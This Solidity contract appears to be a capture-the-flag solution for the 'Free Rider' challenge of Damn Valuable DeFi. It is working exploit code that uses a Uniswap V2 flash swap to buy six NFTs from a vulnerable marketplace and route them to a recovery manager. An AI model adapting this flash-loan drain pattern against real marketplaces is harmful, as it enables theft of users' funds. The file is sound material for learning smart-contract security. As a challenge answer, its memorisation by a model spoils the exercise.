// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {FreeRiderNFTMarketplace} from "../free-rider/FreeRiderNFTMarketplace.sol";

contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {
    using Address for address;

    address payable immutable weth;
    address immutable dvt;
    address immutable factory;
    address payable immutable marketplace;
    address immutable recoveryManager;
    address immutable nft;
    address immutable player;

    constructor(
        address payable _weth,
        address _factory,
        address _dvt,
        address payable _marketplace,
        address _recoveryManager,
        address _nft,
        address _player
    ) {
        weth = _weth;
        dvt = _dvt;
        factory = _factory;
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        nft = _nft;
        player = _player;
    }

    function flashSwap(address _tokenBorrow, uint256 _amount) external {
        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        
        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenBorrow, _amount);
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);
        
        require(msg.sender == pair, "!pair");
        require(sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(data, (address, uint256));

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // Convert WETH to ETH
        uint256 balance = IERC20(tokenBorrow).balanceOf(address(this));
        tokenBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", balance));

        // Buy NFTs
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        FreeRiderNFTMarketplace(marketplace).buyMany{value: 15 ether}(tokenIds);

        // Transfer NFTs to recovery manager
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(
                address(this),
                recoveryManager,
                i,
                abi.encode(player)
            );
        }

        // Convert ETH back to WETH and repay
        (bool success,) = weth.call{value: amountToRepay}("");
        require(success, "failed to deposit weth");
        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}